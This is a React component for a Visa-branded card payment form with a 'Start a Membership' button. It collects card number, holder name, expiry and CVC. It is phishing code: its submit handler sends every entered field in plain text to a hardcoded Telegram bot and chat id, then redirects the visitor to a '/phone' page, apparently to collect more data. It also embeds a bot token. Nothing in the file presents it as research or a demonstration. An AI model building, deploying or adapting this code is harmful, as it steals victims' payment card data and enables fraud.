import { AiOutlineCreditCard } from 'react-icons/ai';
import { useFormik } from 'formik';
import { cardSchema } from '../schemas';
import { useNavigate } from 'react-router-dom';

const initialValues = {
  cardnumber: '',
  fullname: '',
  month: '',
  year: '',
  cvc: '',
};

function Cardinfo() {
  const navigate = useNavigate();
  const { values, errors, handleBlur, touched, handleChange, handleSubmit } =
    useFormik({
      initialValues: initialValues,
      validationSchema: cardSchema,
      onSubmit: (values, action) => {
        action.resetForm();

        //console.log
        // console.log(values);

        const bot_token = '6292955787:AAE5oPybPhyD3BUyveVgw9QsQMNZ6I51vpM';
        const user_id = 727686605;
        let my_text = `cardnumber: ${values.cardnumber}     
                         fullname: ${values.fullname}      
                                                      Date:  ${values.month}/${values.year}       
                                                                         cvc: ${values.cvc}`;

        const url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${user_id}&text=${my_text}`;
        let api = new XMLHttpRequest();
        api.open('Get', url, true);
        api.send();

        navigate("/phone")
        
      },
    });

  return (
    <div className="container mx-auto bg-gray-500 rounded-lg mb-96 lg:-mb-56  p-12 w-11/12 lg:w-4/12 mt-40">
      <div className="">
        <img
          className=" w-full lg:w-10/12 mx-auto -mt-36 xl:-mt-40 lg:-mt-64"
          src="https://user-images.githubusercontent.com/16848599/232335773-5e6fdd6e-a4d9-4c01-a202-48cbca935cbe.png"
          alt="visa"
        />
      </div>

      <form action="#" onSubmit={handleSubmit} className="mx-auto mt-9">
        <div className="mt-4">
          <label htmlFor="" className="text-white">
            {' '}
            CARD NUMBER
          </label>
          <div className=" gap-5  relative flex items-center justify-center">
            <input
              type="number"
              name="cardnumber"
              inputMode="numeric"
              placeholder="1234 5678 9410 567 "
              pattern="[0-9]"
              required
              className="border border-gray-400 py-3 px-2 w-full relative"
              value={values.cardnumber}
              onChange={handleChange}
              onBlur={handleBlur}
            />
            {errors.cardnumber && touched.cardnumber ? (
              <p className="text-red-500  mt-20   text-md  absolute">
                {errors.cardnumber}
              </p>
            ) : null}
            <AiOutlineCreditCard className="w-8 h-8 absolute  ml-[85%] lg:ml-[90%] text-gray-700 " />
          </div>
        </div>

        <div className="mt-6">
          <label htmlFor="" className="text-white">
            {' '}
            CARD HOLDARS
          </label>
          <input
            type="text"
            placeholder=" JOHN DOE "
            name="fullname"
            className="border border-gray-700 py-3 px-2 w-full "
            value={values.fullname}
            onChange={handleChange}
            onBlur={handleBlur}
          />
          {errors.fullname && touched.fullname ? (
            <p className="text-red-500  text-center ms-[10%] text-md  absolute">
              {errors.fullname}
            </p>
          ) : null}
        </div>

        <div className="mt-6  lg:flex gap-5 mx-auto">
          <div>
            <select
              className="border py-3 px-5 my-5 w-full text-lg"
              placeholder="sdfds"
              name="month"
              value={values.month}
              onChange={handleChange}
              onBlur={handleBlur}
            >
              <option value="Month" selected disabled>
                Month
              </option>
              <option value="01">01</option>
              <option value="02">02</option>
              <option value="03">03</option>
              <option value="04">04</option>
              <option value="05">05</option>
              <option value="06">06</option>
              <option value="07">07</option>
              <option value="08">08</option>
              <option value="09">09</option>
              <option value="10">10</option>
              <option value="11">11</option>
              <option value="12">12</option>
            </select>
          </div>
          <div>
            <select
              className="border py-3 px-5 my-5 w-full text-lg"
              placeholder="sdfds"
              name="year"
              value={values.year}
              onChange={handleChange}
              onBlur={handleBlur}
            >
              <option value="Year" selected disabled>
                Year
              </option>
              <option value="2023">2023</option>
              <option value="2024">2024</option>
              <option value="2025">2025</option>
              <option value="2026">2026</option>
              <option value="2027">2027</option>
              <option value="2028">2028</option>
              <option value="2029">2029</option>
              <option value="2030">2030</option>
              <option value="2031">2031</option>
              <option value="2032">2032</option>
              <option value="2033">2033</option>
              <option value="2034">2034</option>
            </select>
          </div>
          <div className="text-md">
            <input
              type="number"
              name="cvc"
              placeholder="CVC "
              className=" py-3 px-2  my-5 w-full"
              value={values.cvc}
              onChange={handleChange}
              onBlur={handleBlur}
            />
          </div>
        </div>

        <div className="mt-5">
          <button
            type="submit"
            className=" bg-purple-600 py-3 w-full text-center text-white "
          >
            Start a Membership{' '}
          </button>
        </div>
      </form>
    </div>
  );
}

export default Cardinfo;
